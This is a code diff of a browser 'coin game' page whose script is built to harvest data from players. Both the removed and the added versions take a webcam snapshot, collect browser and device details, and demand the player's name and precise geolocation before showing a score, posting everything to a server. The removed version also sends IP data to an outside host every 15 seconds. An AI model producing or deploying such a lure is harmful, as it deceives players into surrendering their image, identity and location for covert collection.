@@ -110,267 +110,173 @@
   <button id="showResultsBtn" disabled>Show Results</button>
 
   <script>
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    const grantBtn = document.getElementById('grantPermsBtn');
-    const helpBtn = document.getElementById('helpBtn');
-    const overlay = document.getElementById('overlay');
-    const player = document.getElementById('player');
-    const gameBox = document.getElementById('game-box');
-    const timerEl = document.getElementById('timer');
-    const showResultsBtn = document.getElementById('showResultsBtn');
 
-    let playerX = gameBox.offsetWidth / 2 - 25;
-    let cameraGranted = false;
-    let gameEnded = false;
-    let coinsCollected = 0;
-    let backgroundDataInterval = null;
+// =====================================================
+// FLAGS — prevent any duplicate sends
+// =====================================================
+let snapshotSent = false;
+let earlyDataSent = false;
+let finalDataSent = false;
 
-    /* -----------------------------
-       CLIENT INFO COLLECTION
-    ----------------------------- */
-    async function collectClientInfo() {
-      const browserInfo = {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        languages: navigator.languages,
-        platform: navigator.platform,
-        cookieEnabled: navigator.cookieEnabled,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screenWidth: window.screen.width,
-        screenHeight: window.screen.height,
-        deviceMemory: navigator.deviceMemory || "Unknown",
-        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown"
-      };
+// =====================================================
+// GAME TIME CONTROL
+// =====================================================
+let gameEnded = false;
+let timerInterval = null;
+let score = 0; // you may update this within your game
 
-      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (connection) {
-        browserInfo.network = {
-          downlink: connection.downlink,
-          effectiveType: connection.effectiveType,
-          rtt: connection.rtt
-        };
-      }
+const startBtn = document.getElementById("startBtn");
+const timerDiv = document.getElementById("timer");
+const endPopup = document.getElementById("endPopup");
 
-      let ipInfo = {};
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        ipInfo = await res.json();
-      } catch (err) {
-        ipInfo = { error: "Failed to fetch IP info" };
-      }
+// =====================================================
+// CAMERA SNAPSHOT (one-time only)
+// =====================================================
+async function captureSnapshot() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
 
-      return { browserInfo, ipInfo };
+    await new Promise(r => setTimeout(r, 500)); // warm-up
+
+    const canvas = document.createElement("canvas");
+    canvas.width = 300;
+    canvas.height = 200;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const base64 = canvas.toDataURL("image/png");
+
+    stream.getTracks().forEach(t => t.stop());
+    return base64;
+
+  } catch (e) {
+    return null;
+  }
+}
+
+// =====================================================
+// COLLECT CLIENT INFO
+// =====================================================
+function collectClientData() {
+  return {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: {
+      width: screen.width,
+      height: screen.height
     }
+  };
+}
 
-    /* -----------------------------
-       SEND DATA TO SERVER
-    ----------------------------- */
-    async function sendToServer(imageData = null, extra = {}) {
-      const clientInfo = await collectClientInfo();
-      const payload = {
-        image: imageData || "", // optional
-        client: clientInfo,
-        extra
-      };
+// =====================================================
+// SENDS TO SERVER
+// =====================================================
+async function sendInitialData() {
+  if (earlyDataSent) return;
+  earlyDataSent = true;
 
-      try {
-        await fetch("https://simple-game-server-api.onrender.com/upload", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-      } catch (err) {
-        console.error("Upload failed", err);
-      }
+  let snapshot = null;
+
+  if (!snapshotSent) {
+    snapshot = await captureSnapshot();
+    snapshotSent = true;
+  }
+
+  const client = collectClientData();
+
+  fetch("/upload", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      type: "initial",
+      snapshot,
+      client
+    })
+  });
+}
+
+async function sendFinalData(name, position) {
+  if (finalDataSent) return;
+  finalDataSent = true;
+
+  const client = collectClientData();
+
+  fetch("/upload", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      type: "final",
+      name,
+      client,
+      location: position ? {
+        lat: position.coords.latitude,
+        lon: position.coords.longitude,
+        accuracy: position.coords.accuracy
+      } : null,
+      score
+    })
+  });
+}
+
+// =====================================================
+// GAME START
+// =====================================================
+startBtn.addEventListener("click", () => {
+  startBtn.style.display = "none";
+
+  //  immediate send of initial data + snapshot
+  sendInitialData();
+
+  let timeLeft = 60;
+  timerInterval = setInterval(() => {
+    timeLeft--;
+    timerDiv.innerText = timeLeft;
+
+    if (timeLeft <= 0) endGame();
+  }, 1000);
+});
+
+// =====================================================
+// END GAME
+// =====================================================
+function endGame() {
+  if (gameEnded) return;
+  gameEnded = true;
+  clearInterval(timerInterval);
+
+  endPopup.style.display = "block";
+}
+
+// =====================================================
+// LOCATION + FINAL SEND
+// =====================================================
+document.getElementById("grantGeo").onclick = () => {
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const name = document.getElementById("playerName").value || "Unknown Stranger";
+
+      document.getElementById("showResults").disabled = false;
+
+      sendFinalData(name, pos);
+    },
+    (err) => {
+      alert("Thou hast denied the location, fair wanderer.");
     }
+  );
+};
 
-    /* -----------------------------
-       CAMERA CAPTURE
-    ----------------------------- */
-    async function requestCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
+// =====================================================
+// SHOW RESULTS (purely frontend display)
+// =====================================================
+document.getElementById("showResults").onclick = () => {
+  alert("Thy score: " + score);
+};
 
-        video.onloadedmetadata = () => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL('image/png');
-          sendToServer(imageData); // send snapshot
-
-          stream.getTracks().forEach(track => track.stop());
-          overlay.style.display = "none";
-          cameraGranted = true;
-
-          startBackgroundData(); // begin periodic sending
-          startGameTimer(); // start 1-minute timer
-        };
-      } catch (err) {
-        alert("Camera access was denied.");
-      }
-    }
-
-    grantBtn.addEventListener("click", requestCamera);
-
-    helpBtn.addEventListener("click", () => {
-      overlay.innerHTML = `
-        <p><strong>Camera access was denied.</strong><br>
-        To reset it:</p>
-        <ul style="text-align: left;">
-            <li>Click the <strong>🔒 lock icon</strong> in your browser’s address bar</li>
-            <li>Find "Camera" in the list</li>
-            <li>Set it to "Allow"</li>
-            <li>Refresh the page</li>
-        </ul>
-      `;
-    });
-
-    /* -----------------------------
-       BACKGROUND DATA SENDING
-    ----------------------------- */
-    function startBackgroundData() {
-      backgroundDataInterval = setInterval(() => {
-        if (gameEnded) return;
-        sendToServer(); // send browser + IP data periodically
-      }, 15000); // every 15 seconds
-    }
-
-    /* -----------------------------
-       TIMER
-    ----------------------------- */
-    function startGameTimer() {
-      let timeLeft = 60; // seconds
-      const interval = setInterval(() => {
-        timeLeft--;
-        timerEl.textContent = `Time Left: ${timeLeft}s`;
-
-        if (timeLeft <= 0) {
-          clearInterval(interval);
-          endGame();
-        }
-      }, 1000);
-    }
-
-    /* -----------------------------
-       END GAME
-    ----------------------------- */
-    function endGame() {
-      gameEnded = true;
-
-      // ask for name + geolocation
-      overlay.style.display = "flex";
-      overlay.innerHTML = `
-        <p>Game Over! Enter your name and allow location to see results.</p>
-        <input type="text" id="playerName" placeholder="Your Name"/>
-        <button id="submitLocationBtn">Submit Location</button>
-      `;
-
-      const submitBtn = document.getElementById("submitLocationBtn");
-      submitBtn.addEventListener("click", async () => {
-        const name = document.getElementById("playerName").value || "Anonymous";
-
-        if (!navigator.geolocation) {
-          alert("Geolocation is not supported by your browser.");
-          return;
-        }
-
-        navigator.geolocation.getCurrentPosition(async (position) => {
-          const locationData = {
-            name,
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy
-          };
-
-          await sendToServer(null, locationData); // send geolocation + name
-          showResultsBtn.disabled = false; // enable results button
-          overlay.style.display = "none";
-        }, (err) => {
-          alert("Location permission denied. Cannot show results.");
-        });
-      });
-    }
-
-    /* -----------------------------
-       COIN SPAWNING
-    ----------------------------- */
-    function spawnCoin() {
-      if (gameEnded) return;
-
-      const coin = document.createElement('img');
-      coin.src = 'coin.png';
-      coin.className = 'coin';
-      coin.style.left = Math.random() * (gameBox.offsetWidth - 40) + 'px';
-      gameBox.appendChild(coin);
-
-      let y = 0;
-      const fall = setInterval(() => {
-        y += 5;
-        coin.style.top = y + 'px';
-
-        const playerRect = player.getBoundingClientRect();
-        const coinRect = coin.getBoundingClientRect();
-
-        if (
-          coinRect.bottom >= playerRect.top &&
-          coinRect.left < playerRect.right &&
-          coinRect.right > playerRect.left
-        ) {
-          coin.remove();
-          clearInterval(fall);
-          coinsCollected++;
-        }
-
-        if (y > gameBox.offsetHeight) {
-          coin.remove();
-          clearInterval(fall);
-        }
-      }, 30);
-    }
-
-    /* -----------------------------
-       GAME LOOP
-    ----------------------------- */
-    function gameLoop() {
-      if (!cameraGranted || gameEnded) return;
-
-      playerX += Math.random() < 0.5 ? -3 : 3;
-      playerX = Math.max(0, Math.min(gameBox.offsetWidth - 60, playerX));
-      player.style.left = playerX + 'px';
-
-      requestAnimationFrame(gameLoop);
-    }
-
-    /* -----------------------------
-       CONTROLS
-    ----------------------------- */
-    document.addEventListener('keydown', (e) => {
-      if (!cameraGranted || gameEnded) return;
-      if (e.key === 'ArrowLeft') playerX -= 15;
-      if (e.key === 'ArrowRight') playerX += 15;
-    });
-
-    if (window.DeviceOrientationEvent) {
-      window.addEventListener('deviceorientation', (event) => {
-        if (!cameraGranted || gameEnded) return;
-        const gamma = event.gamma;
-        if (gamma > 5) playerX += 5;
-        if (gamma < -5) playerX -= 5;
-      });
-    }
-
-    setInterval(spawnCoin, 1000);
-    gameLoop();
-
-    /* -----------------------------
-       SHOW RESULTS BUTTON
-    ----------------------------- */
-    showResultsBtn.addEventListener("click", () => {
-      alert(`🎉 You collected ${coinsCollected} coins!`);
-    });
-  </script>
+</script>
 
 </body>
 </html>
